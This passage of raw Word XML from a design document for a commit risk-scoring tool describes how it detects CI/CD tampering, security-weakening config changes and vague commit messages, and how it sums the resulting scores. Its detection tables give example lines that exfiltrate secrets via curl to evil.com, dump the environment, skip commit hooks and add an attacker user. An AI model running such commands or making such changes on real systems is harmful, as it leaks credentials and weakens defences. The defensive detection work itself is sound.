        <w:br/>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Score: +1.5 for any dependency tampering detected.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.6 CI/CD Pipeline Tampering Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Modifications to CI/CD pipeline configuration files are analyzed for patterns that could indicate an attacker weakening the build/deploy security posture or exfiltrating secrets.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Monitored CI/CD Files</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t>CICD_FILE_PATTERNS = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r".github/workflows/.*\.ya?ml$",    # GitHub Actions</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r"Jenkinsfile$",                      # Jenkins</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r".gitlab-ci\.ya?ml$",               # GitLab CI</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r"azure-pipelines\.ya?ml$",          # Azure Pipelines</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r".circleci/config\.ya?ml$",         # CircleCI</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r"Dockerfile$",                       # Docker</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r"docker-compose.*\.ya?ml$",         # Docker Compose</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r".travis\.ya?ml$",                  # Travis CI</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r"bitbucket-pipelines\.ya?ml$",      # Bitbucket</w:t>
        <w:br/>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Tampering Patterns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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Pattern</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Signal Label</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Example</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Commenting out security tools</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>security_scan_disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t># snyk test, # trivy scan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Disabling checks via env vars</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>security_check_disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>SKIP_SCAN=true, DISABLE_SAST=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>--no-verify flag</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>hook_bypass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>git commit --no-verify</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Echoing secrets to stdout</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>secret_exfil_ci</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>echo $SECRET_KEY | curl ...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>curl with secret variables</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>secret_exfil_ci</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>curl -H "Auth: $TOKEN" evil.com</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Environment dump</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>env_dump_ci</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>printenv | ..., env | curl</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Production deploy changes</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>prod_deploy_change</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>deploy to production, push to live</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Untrusted Docker base image</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>untrusted_base_image</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>FROM random-registry/image</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Adding users in Dockerfile</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>docker_user_add</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>RUN useradd attacker</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Exposing extra ports</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>port_exposed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>EXPOSE 4444, EXPOSE 9999</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Additionally, removed lines in CI/CD files are checked for security tool references. If a removed line references any of the following tools, it flags as "security_tool_removed": snyk, sonar, trivy, semgrep, bandit, brakeman, safety, gitleaks, trufflehog, checkov, tfsec, grype, syft, cosign.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Score: +1.5 per CI/CD tampering instance, capped at +3.0 total.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.7 Configuration Weakening Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Security-relevant configuration files are monitored for changes that weaken the application's security posture. This includes both explicit config files and any file with config-like naming.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Monitored Config Files</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t>CONFIG_SECURITY_FILES = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r".gitignore$",           # Tracking rules</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r"CODEOWNERS$",           # Review protection</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r".github/CODEOWNERS$",   # GitHub-specific</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r"branch-protection",     # Branch rules</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r"renovate.json",         # Dependency updates</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r".dependabot/",          # Auto-update config</w:t>
        <w:br/>
        <w:t>]</w:t>
        <w:br/>
        <w:br/>
        <w:t># Also checks any file containing:</w:t>
        <w:br/>
        <w:t># "config", "settings", "nginx", "apache", "cors",</w:t>
        <w:br/>
        <w:t># ".cfg", ".ini", ".toml", ".yaml", ".yml"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Weakening Patterns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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Pattern</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Signal Label</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>What It Detects</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CORS wildcard</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>cors_wildcard</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Access-Control-Allow-Origin: * or allow_origins=["*"]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Session timeout extension</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>session_timeout_extended</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>session_timeout=86400/604800/31536000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>MFA/2FA disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>mfa_disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>MFA=false, 2fa=disabled, two_factor=off</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Auth disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>auth_disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>require_auth=false, auth_required=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Rate limiting removed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>rate_limit_disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>rate_limit=false, throttle=none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Debug mode enabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>debug_enabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>DEBUG=true, debug=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>SSL verification disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>ssl_verify_disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>verify_ssl=false, SSL_VERIFY=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Weak TLS version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>weak_tls</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TLS=1.0, ssl=1.1, SSLv3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Special Cases</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>.gitignore monitoring: When security-relevant patterns (.env, .pem, .key, secret, credential, token, password) are REMOVED from .gitignore, it means previously ignored sensitive files could now be tracked by git. This is flagged as "gitignore_sensitive_unignored".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>CODEOWNERS monitoring: Removed lines from CODEOWNERS files indicate that code review protection has been weakened for certain paths. Flagged as "codeowner_removed".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Score: +1.0 per config weakening instance, capped at +2.0 total.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.8 Suspicious Commit Messages</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Large commits (&gt;50 lines changed) with vague or empty commit messages are flagged. This detects attempts to sneak significant changes under the radar.</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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Detection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Example</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Empty message</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Message length &lt; 4 characters</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>"..", "", "ok"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Vague message</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Single-word generic term on large commit</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>"fix", "update", "wip", "tmp", "stuff", "asdf", "done"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Score: +0.5 for suspicious message detected.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.9 Risk Score Aggregation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>All signal scores are summed and capped at 10.0 to produce the final risk score. The score maps to a risk level for display and filtering.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Complete Score Weight Table</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pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Signal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Weight</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Cap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Accumulated?</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Critical SAST finding</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+2.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>No cap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Per finding</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
